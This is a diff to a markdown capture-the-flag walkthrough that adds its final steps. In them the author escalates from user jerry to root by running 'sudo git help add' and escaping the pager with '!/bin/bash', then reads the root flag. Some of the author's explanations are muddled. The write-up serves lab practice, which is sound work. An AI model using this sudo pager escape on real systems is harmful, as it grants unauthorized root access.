@@ -183,7 +183,6 @@ we found jerry.
 
 
 
-
 cd jerry
 
 ls
@@ -192,6 +191,48 @@ cat flag4.txt
 
 
 ![Screenshot from 2023-01-20 00-27-29](https://user-images.githubusercontent.com/108471951/213536148-d1b709b4-b8c1-4944-ade8-e1030060b911.png)
+
+Now to fsearch for the final flag in root dirctory but i dont have permission
+
+
+![Screenshot from 2023-01-25 02-30-38](https://user-images.githubusercontent.com/108471951/214413216-a9b7db4d-d8fa-4461-bdda-137bd4aba57d.png)
+
+so we should add a user
+
+sudo git help add
+
+
+![Screenshot from 2023-01-25 02-37-15](https://user-images.githubusercontent.com/108471951/214415259-d728377b-4ffd-4ae2-89fb-16e9b45fe76b.png)
+
+now to get root accses 
+
+
+su jerry
+
+![Screenshot from 2023-01-25 02-40-01](https://user-images.githubusercontent.com/108471951/214416578-eec4a852-b8fc-4458-b05d-ca06d2ff6fa8.png)
+
+
+now we should use some script for that ....
+
+commands-
+
+sudo git help add 
+
+!/bin/bash
+
+![Screenshot from 2023-01-25 02-43-24](https://user-images.githubusercontent.com/108471951/214418107-990e7978-b5b7-4676-afb1-be4639b18312.png)
+
+now we can go to root folder 
+
+cd /root
+ls
+cat final-flag.txt
+
+
+![Screenshot from 2023-01-25 02-44-31](https://user-images.githubusercontent.com/108471951/214418585-3070f7cd-44b3-4b35-8492-3af0446a6510.png)
+
+
+
 
 succesfully we have found the final flag.
 
